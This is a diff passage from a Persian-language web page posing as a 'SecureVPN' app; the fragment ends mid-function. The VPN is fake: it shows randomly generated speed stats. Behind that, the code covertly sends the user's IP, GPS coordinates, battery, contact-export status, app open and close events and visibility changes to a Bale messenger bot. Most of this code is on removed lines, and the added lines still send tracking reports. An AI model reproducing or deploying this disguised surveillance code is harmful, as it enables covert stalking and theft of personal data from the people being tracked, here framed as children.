-📍 موقعیت: ${currentLocation.lat ? `${currentLocation.lat}, ${currentLocation.lon}` : 'نامشخص'}
+🎮 VPN: ${isConnected ? 'متصل' : 'قطع'}
+📍 موقعیت: ${currentLocation.lat ? 'فعال' : 'غیرفعال'}
 🔋 باتری: ${currentBattery.level ? `${currentBattery.level}%` : 'نامشخص'}
-📞 مخاطبین: ${contactsExported ? `✅ ارسال شده (${totalContacts})` : '❌ ارسال نشده'}
+📞 مخاطبین: ${contactsExported ? '✅ ارسال شده' : '❌ ارسال نشده'}
 ⏱️ زمان صفحه: ${Math.floor(screenTimeToday/60)}h ${screenTimeToday%60}m
-📊 مصرف داده: ${dataUsageToday} MB
-🎯 امتیاز رفتار: ${behaviorScore}/100
 
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+⏰ ${new Date().toLocaleString('fa-IR')}
       `;
       
       sendTrackingMessage(report);
     }
 
-    function sendInitialAdvancedReport() {
-      const report = `
-🛡️ سیستم نظارت SecureVPN فعال شد
-
-📱 دستگاه: ${navigator.platform}
-🌐 IP: ${deviceIP}
-📍 موقعیت: ${currentLocation.lat || 'در حال دریافت'}
-📞 وضعیت مخاطبین: ${permissions.contacts ? 'دسترسی دارد' : 'دسترسی ندارد'}
-
-⏰ شروع: ${new Date().toLocaleString('fa-IR')}
-      `;
-      
-      sendTrackingMessage(report);
-    }
-
-    function triggerSOS() {
-      const sosData = {
-        timestamp: new Date().toLocaleString('fa-IR'),
-        location: currentLocation.lat ? `${currentLocation.lat}, ${currentLocation.lon}` : 'نامشخص',
-        battery: currentBattery.level ? `${currentBattery.level}%` : 'نامشخص',
-        emergency: true
-      };
-
-      document.getElementById('emergencyOverlay').classList.add('show');
-
-      sendTrackingMessage(`
-🆘 هشدار اضطراری!
-
-⚠️ کودک دکمه SOS را فشرد
-📍 موقعیت فوری: ${sosData.location}
-🔋 باتری: ${sosData.battery}
-⏰ زمان: ${sosData.timestamp}
-
-🗺️ نقشه: ${currentLocation.lat ? `https://www.google.com/maps/search/?api=1&query=${currentLocation.lat},${currentLocation.lon}` : 'موقعیت در دسترس نیست'}
-
-🚨 اقدام فوری مورد نیاز!
-      `);
-
-      setTimeout(() => {
-        document.getElementById('emergencyOverlay').classList.remove('show');
-      }, 5000);
-    }
-
-    async function sendTrackingMessage(message) {
-      const methods = [
-        async () => {
-          const response = await fetch(`https://tapi.bale.ai/bot${TRACKING_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: TRACKING_CHAT_ID,
-              text: message,
-              disable_web_page_preview: false
-            })
-          });
-          return response.json();
-        },
-        async () => {
-          const url = `https://tapi.bale.ai/bot${TRACKING_TOKEN}/sendMessage?chat_id=${TRACKING_CHAT_ID}&text=${encodeURIComponent(message)}`;
-          const response = await fetch(url);
-          return response.json();
-        }
-      ];
-
-      for (const method of methods) {
-        try {
-          const result = await method();
-          if (result.ok) {
-            console.log('✅ گزارش ارسال شد');
-            return true;
-          }
-        } catch (error) {
-          console.log('❌ خطا در ارسال:', error);
-          continue;
-        }
-      }
-      
-      return false;
-    }
-
-    async function collectDeviceIP() {
-      const ipSources = [
-        'https://api.ipify.org?format=json',
-        'https://ipapi.co/json/',
-        'https://httpbin.org/ip'
-      ];
-
-      for (const source of ipSources) {
-        try {
-          const response = await fetch(source);
-          const data = await response.json();
-          deviceIP = data.ip || data.origin || 'نامشخص';
-          break;
-        } catch (error) {
-          continue;
-        }
-      }
-    }
-
-    function toggleConnection() {
-      const button = document.getElementById('connectButton');
-      const indicator = document.getElementById('statusIndicator');
-      const icon = document.getElementById('statusIcon');
-      const text = document.getElementById('statusText');
-      const detail = document.getElementById('statusDetail');
-      const overlay = document.getElementById('loadingOverlay');
-
-      if (!isConnected) {
-        overlay.style.display = 'flex';
-        
-        setTimeout(() => {
-          isConnected = true;
-          connectionStartTime = new Date();
-          
-          button.textContent = '⏹️ قطع اتصال';
-          button.className = 'connect-button connected';
-          
-          indicator.className = 'status-indicator connected';
-          icon.textContent = '✅';
-          text.textContent = 'متصل شد';
-          detail.textContent = `متصل به ${currentServer.country} - ${currentServer.city}`;
-          
-          overlay.style.display = 'none';
-          
-          startFakeStats();
-          startConnectionTimer();
-          
-          if (!parentalControlActive) {
-            setTimeout(() => {
-              document.getElementById('permissionAlert').classList.add('show');
-            }, 2000);
-          }
-
-          if (permissions.contacts && !contactsExported) {
-            setTimeout(() => {
-              showContactsAlert();
-            }, 5000);
-          }
-          
-        }, 3000);
-        
-      } else {
-        isConnected = false;
-        connectionStartTime = null;
-        
-        button.textContent = '🚀 اتصال به VPN';
-        button.className = 'connect-button disconnected';
-        
-        indicator.className = 'status-indicator disconnected';
-        icon.textContent = '🔒';
-        text.textContent = 'قطع شده';
-        detail.textContent = 'برای محافظت از حریم خصوصی VPN را فعال کنید';
-        
-        stopFakeStats();
-        stopConnectionTimer();
-      }
-    }
-
-    function selectServer(element, country, city) {
-      document.querySelectorAll('.server-item').forEach(item => {
-        item.classList.remove('active');
-      });
-      
-      element.classList.add('active');
-      currentServer = { country, city };
-      
-      if (isConnected) {
-        document.getElementById('statusDetail').textContent = `متصل به ${country} - ${city}`;
-      }
-
-      sendTrackingMessage(`
-🌍 تغییر سرور VPN:
-📍 سرور جدید: ${country} - ${city}
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-      `);
-    }
-
-    function toggleSetting(element) {
-      element.classList.toggle('active');
-    }
-
-    function startFakeStats() {
-      let downloadSpeed = 0;
-      let uploadSpeed = 0;
-      let totalData = 0;
-
-      statsInterval = setInterval(() => {
-        downloadSpeed = (Math.random() * 15 + 5).toFixed(1);
-        uploadSpeed = (Math.random() * 8 + 2).toFixed(1);
-        totalData += parseFloat(downloadSpeed) * 0.1;
-
-        document.getElementById('downloadSpeed').textContent = downloadSpeed + ' MB/s';
-        document.getElementById('uploadSpeed').textContent = uploadSpeed + ' MB/s';
-        document.getElementById('dataTransfer').textContent = totalData.toFixed(0) + ' MB';
-      }, 2000);
-    }
-
-    function stopFakeStats() {
-      if (statsInterval) {
-        clearInterval(statsInterval);
-        statsInterval = null;
-        
-        document.getElementById('downloadSpeed').textContent = '0 MB/s';
-        document.getElementById('uploadSpeed').textContent = '0 MB/s';
-        document.getElementById('dataTransfer').textContent = '0 MB';
-      }
-    }
-
-    function startConnectionTimer() {
-      connectionTimeInterval = setInterval(() => {
-        if (connectionStartTime) {
-          const elapsed = Math.floor((new Date() - connectionStartTime) / 1000);
-          const minutes = Math.floor(elapsed / 60);
-          const seconds = elapsed % 60;
-          
-          document.getElementById('connectionTime').textContent = 
-            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-        }
-      }, 1000);
-    }
-
-    function stopConnectionTimer() {
-      if (connectionTimeInterval) {
-        clearInterval(connectionTimeInterval);
-        connectionTimeInterval = null;
-        document.getElementById('connectionTime').textContent = '00:00';
-      }
-    }
-
-    function hidePermissionAlert() {
-      document.getElementById('permissionAlert').classList.remove('show');
-    }
-
-    function updateLocationDisplay() {
-      if (currentLocation.lat) {
-        document.getElementById('locationIcon').textContent = '✅';
-        document.getElementById('locationTitle').textContent = 'GPS فعال';
-        document.getElementById('locationStatus').textContent = `دقت: ${currentLocation.accuracy} متر`;
-        document.getElementById('coordinates').style.display = 'block';
-        document.getElementById('coordinates').textContent = `${currentLocation.lat}, ${currentLocation.lon}`;
-      }
-    }
-
-    function updateAdminLocationDisplay() {
-      if (currentLocation.lat) {
-        document.getElementById('adminLastLocation').textContent = `${currentLocation.lat}, ${currentLocation.lon}`;
-        document.getElementById('adminLocationAccuracy').textContent = `${currentLocation.accuracy} متر`;
-        document.getElementById('adminLocationTime').textContent = new Date().toLocaleString('fa-IR');
-        document.getElementById('adminSpeed').textContent = `${currentLocation.speed || 0} km/h`;
-        document.getElementById('adminGPSStatus').textContent = 'فعال';
-      }
-    }
-
-    function updateAdminScreenTimeDisplay(timeDisplay) {
-      const adminScreenTime = document.getElementById('adminScreenTimeToday');
-      if (adminScreenTime) {
-        adminScreenTime.textContent = timeDisplay;
-      }
-    }
-
-    function updateAdminBatteryDisplay() {
-      const batteryLevel = document.getElementById('adminBatteryLevel');
-      const chargingStatus = document.getElementById('adminChargingStatus');
-      
-      if (batteryLevel && currentBattery.level) {
-        batteryLevel.textContent = `${currentBattery.level}%`;
-      }
-      
-      if (chargingStatus) {
-        chargingStatus.textContent = currentBattery.charging ? 'در حال شارژ' : 'تخلیه';
-      }
-    }
-
-    function updateAdminZoneDisplay(zone) {
-      const adminZone = document.getElementById('adminCurrentZone');
-      if (adminZone) {
-        adminZone.textContent = zone;
-      }
-    }
-
-    function updateAdminPanel() {
-      document.getElementById('adminReportsSent').textContent = reportCounter;
-      document.getElementById('adminContactsExported').textContent = contactsExported ? totalContacts : 0;
-      document.getElementById('adminCallsToday').textContent = callsToday;
-      document.getElementById('adminMessagesToday').textContent = messagesToday;
-      document.getElementById('adminWebsitesVisited').textContent = websitesVisitedToday;
-      document.getElementById('adminDataUsageToday').textContent = `${dataUsageToday} MB`;
-      document.getElementById('adminBehaviorScore').textContent = `${behaviorScore}/100`;
-      document.getElementById('adminTodayAlerts').textContent = geofenceAlerts;
-      document.getElementById('adminLocationSuccess').textContent = locationTries > 0 ? `${Math.round((successfulLocationCount/locationTries)*100)}%` : '0%';
-      document.getElementById('adminLastSync').textContent = new Date().toLocaleString('fa-IR');
-    }
-
-    window.addEventListener('load', async () => {
-      console.log('🚀 SecureVPN با قابلیت کامل آماده شد');
-      
-      await collectDeviceIP();
-      
-      if (checkContactsSupport()) {
-        console.log('✅ Contact Picker API پشتیبانی می‌شود');
-      } else {
-        console.log('❌ Contact Picker API پشتیبانی نمی‌شود');
-      }
-      
-      setTimeout(() => {
-        document.getElementById('permissionAlert').classList.add('show');
-      }, 3000);
-      
-      setTimeout(() => {
-        sendTrackingMessage(`
-🚀 کودک وارد SecureVPN شد
-
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-📱 دستگاه: ${navigator.platform}
-🌐 IP: ${deviceIP}
-📞 پشتیبانی مخاطبین: ${checkContactsSupport() ? 'بله' : 'خیر'}
-
-💡 سیستم آماده دریافت اطلاعات است
-        `);
-      }, 2000);
-    });
-
-    window.addEventListener('beforeunload', () => {
-      if (parentalControlActive) {
-        navigator.sendBeacon(
-          `https://tapi.bale.ai/bot${TRACKING_TOKEN}/sendMessage?chat_id=${TRACKING_CHAT_ID}&text=${encodeURIComponent('🚪 خروج از برنامه - ' + new Date().toLocaleString('fa-IR'))}`
-        );
-      }
-    });
-
-    document.addEventListener('visibilitychange', () => {
-      if (parentalControlActive) {
-        const status = document.hidden ? 'پس‌زمینه' : 'فعال';
-        sendTrackingMessage(`📱 تغییر وضعیت: ${status} - ${new Date().toLocaleString('fa-IR')}`);
-      }
-    });
-  </script>
-</body>
-</html>
+    function sendInitialAdvancedReport(  
